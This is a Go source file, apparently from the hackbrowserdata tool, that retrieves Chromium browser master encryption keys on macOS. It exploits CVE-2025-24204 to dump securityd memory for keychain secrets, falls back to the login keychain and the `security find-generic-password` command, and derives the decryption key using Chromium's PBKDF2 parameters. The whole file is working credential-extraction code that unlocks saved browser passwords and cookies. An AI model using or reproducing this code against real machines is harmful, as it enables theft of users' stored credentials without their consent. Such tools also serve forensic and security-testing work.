//go:build darwin

package masterkey

import (
	"bytes"
	"context"
	"crypto/sha1"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/moond4rk/keychainbreaker"

	"github.com/moond4rk/hackbrowserdata/internal/keychain"
	"github.com/moond4rk/hackbrowserdata/internal/log"
)

// https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
var darwinParams = pbkdf2Params{
	salt:       []byte("saltysalt"),
	iterations: 1003,
	keySize:    16,
	hashFunc:   sha1.New,
}

const securityCmdTimeout = 30 * time.Second

// The v10 strategies in order, first success wins: the securityd dump (root only), the run's login keychain,
// then the `security` CLI, which may prompt.
var platformRetrievers = []Retriever{
	&gcoredumpRetriever{},
	keychainRetriever{},
	&securityRetriever{cache: make(map[string]securityResult)},
}

// gcoredumpRetriever extracts keychain secrets via CVE-2025-24204 (dumps securityd memory; needs root).
// Records are cached once (sync.Once) so the dump runs a single time across all browsers.
type gcoredumpRetriever struct {
	once    sync.Once
	records []keychainbreaker.GenericPassword
	err     error
}

func (*gcoredumpRetriever) Version() Version { return V10 }

// Retrieve steps aside on failure: the common "needs root" case isn't warning-worthy and would drown real warnings.
func (r *gcoredumpRetriever) Retrieve(_ context.Context, loc Locator) ([]byte, error) {
	r.once.Do(func() {
		r.records, r.err = DecryptKeychainRecords()
	})
	if r.err != nil {
		log.Debugf("gcoredump: %v", r.err)
		return nil, ErrNotApplicable
	}

	key, err := findStorageKey(r.records, loc.KeychainLabel)
	if err != nil {
		log.Debugf("gcoredump: %v", err)
		return nil, ErrNotApplicable
	}
	return key, nil
}

func findStorageKey(records []keychainbreaker.GenericPassword, storage string) ([]byte, error) {
	for _, rec := range records {
		if rec.Account == storage {
			return darwinParams.deriveKey(rec.Password), nil
		}
	}
	return nil, fmt.Errorf("%q: %w", storage, errStorageNotFound)
}

// keychainRetriever reads the label's secret from the run's login keychain (no root). Without a keychain, or with a
// locked one, it steps aside: the keychain reports why once for the whole run.
type keychainRetriever struct{}

func (keychainRetriever) Version() Version { return V10 }

func (keychainRetriever) Retrieve(ctx context.Context, loc Locator) ([]byte, error) {
	if loc.Keychain == nil {
		return nil, ErrNotApplicable
	}
	secret, err := loc.Keychain.GenericPassword(ctx, loc.KeychainLabel)
	if errors.Is(err, keychain.ErrLocked) {
		return nil, ErrNotApplicable
	}
	if err != nil {
		return nil, err
	}
	return darwinParams.deriveKey(secret), nil
}

// securityRetriever queries Keychain via the macOS `security` CLI (may prompt). Results are
// cached per storage name so each browser's key is fetched once.
type securityRetriever struct {
	mu    sync.Mutex
	cache map[string]securityResult
}

type securityResult struct {
	key []byte
	err error
}

func (*securityRetriever) Version() Version { return V10 }

func (r *securityRetriever) Retrieve(ctx context.Context, loc Locator) ([]byte, error) {
	storage := loc.KeychainLabel
	r.mu.Lock()
	defer r.mu.Unlock()

	if res, ok := r.cache[storage]; ok {
		return res.key, res.err
	}

	key, err := r.retrieveKeyOnce(ctx, storage)
	r.cache[storage] = securityResult{key: key, err: err}
	return key, err
}

func (r *securityRetriever) retrieveKeyOnce(ctx context.Context, storage string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(ctx, securityCmdTimeout)
	defer cancel()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, "security", "find-generic-password", "-wa", strings.TrimSpace(storage)) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return nil, fmt.Errorf("security command timed out after %s", securityCmdTimeout)
		}
		// `security` exits non-zero with empty stderr when the user denies the prompt or mistypes;
		// surface that instead of the cryptic "exit status 128 ()".
		stderrStr := strings.TrimSpace(stderr.String())
		if stderrStr == "" {
			return nil, fmt.Errorf("security command: %w (likely keychain access denied or wrong password)", err)
		}
		return nil, fmt.Errorf("security command: %w (%s)", err, stderrStr)
	}
	if stderr.Len() > 0 {
		return nil, fmt.Errorf("keychain: %s", strings.TrimSpace(stderr.String()))
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return nil, fmt.Errorf("keychain: empty secret for %s", storage)
	}

	return darwinParams.deriveKey(secret), nil
}
